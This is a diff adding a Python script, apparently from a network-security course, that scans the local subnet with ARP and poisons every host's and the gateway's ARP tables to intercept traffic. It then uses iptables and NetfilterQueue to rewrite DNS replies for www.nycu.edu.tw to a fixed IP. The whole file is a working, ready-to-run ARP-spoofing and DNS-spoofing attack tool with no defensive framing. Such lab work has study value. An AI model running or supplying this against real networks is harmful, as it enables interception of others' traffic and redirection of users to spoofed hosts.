@@ -1,0 +1,111 @@
+#!/usr/bin/env python3
+
+import os
+import netifaces
+import math
+from scapy.all import ARP, Ether, srp, send, DNSRR, DNS, DNSQR, IP, UDP
+import threading
+from time import sleep
+from netfilterqueue import NetfilterQueue
+
+run_event = threading.Event()
+available_dev = {}
+queue_num = 0
+
+def main():
+    if os.geteuid() != 0:
+        print('You should run as root')
+        exit(0)
+    arp_scan()
+
+    try:
+        t1 = threading.Thread(target = arp_spoof)
+        t1.start()
+    except:
+        print("Thread(arp spoof) init failure")
+    
+    os.system(f'sudo iptables -I FORWARD -p udp --sport 53 -j NFQUEUE --queue-num {queue_num}')
+    queue = NetfilterQueue()
+    queue.bind(queue_num, dns_spoof)
+
+    try:
+        queue.run()
+    except KeyboardInterrupt:
+        os.system(f'sudo iptables -D FORWARD -p udp --sport 53 -j NFQUEUE --queue-num {queue_num}')
+        print("\nthread starts closing...")
+        run_event.set()
+        t1.join()
+        print("thread has closed!!")
+
+
+def arp_scan():
+    ipv4 = netifaces.ifaddresses('ens33')[netifaces.AF_INET][0]
+    
+    cidr = 32
+    for m in ipv4['netmask'].split('.'):
+        cidr -= int(math.log2(256 - int(m)))
+    
+    net = f'{ipv4["addr"]}/{cidr}'
+    arp = ARP(pdst = net)
+    broadcast = Ether(dst = 'ff:ff:ff:ff:ff:ff')
+    ans, unans = srp(broadcast/arp, timeout = 2, verbose = False)
+    
+    for snt, rcv in ans:
+        available_dev[rcv.psrc] = rcv.hwsrc
+
+    print("Available devices")
+    print("-----------------------------------")
+    print("IP                MAC              ")
+    print("-----------------------------------")
+    
+    for k, v in available_dev.items():
+        print(f'%-15s%20s' %(k, v))
+    print()
+
+
+def arp_spoof():
+    '''
+    gateway = ('192.168.211.2', 'ens33')
+
+    ARP(op=2, pdst=victim_ip, hwdst=get_mac(victim_ip), psrc=original_ip)
+    # op=1 -> request; op=2 -> reply
+    # set psrc to make victim_ip misunderstand the source is from router (in fact from attacker)  
+    '''
+    gateway = netifaces.gateways()['default'][netifaces.AF_INET]
+    arppkts = []
+    for vic_ip, vic_mac in available_dev.items():
+        if vic_ip == gateway[0]:
+            continue
+        arp2vic = ARP(op=2, pdst = vic_ip, hwdst = vic_mac, psrc = gateway[0])
+        arp2rt = ARP(op=2, pdst = gateway[0], hwdst = available_dev[gateway[0]], psrc = vic_ip)
+        arppkts.append((arp2vic, arp2rt))
+    while True:
+        for idx in range(len(arppkts)):
+            send(arppkts[idx][0], verbose = False)
+            send(arppkts[idx][1], verbose = False)
+        sleep(2)
+        if run_event.is_set():
+            break
+
+
+def dns_spoof(pkt):
+    print("In dns_spoof...")
+    scapy_pkt = IP(pkt.get_payload()) # convert pkt to packet in the format of scapy
+    if scapy_pkt.haslayer(DNSRR):     # only mofidy the payload of DNS reply record
+        if scapy_pkt[DNSQR].qname == b'www.nycu.edu.tw.':
+            print("Spoofing the target...")
+            scapy_pkt[DNS].ancount = 1
+            scapy_pkt[DNS].an = DNSRR(rrname = b'www.nycu.edu.tw', rdata = "140.113.207.241")
+            
+            # because modify DNS response payload, IP, UDP length and checksum need to delete 
+            # scapy will calculate automatically
+            del scapy_pkt[IP].len
+            del scapy_pkt[IP].chksum
+            del scapy_pkt[UDP].len
+            del scapy_pkt[UDP].chksum
+            pkt.set_payload(bytes(scapy_pkt))
+    pkt.accept()
+
+
+if __name__ == '__main__':
+    main()
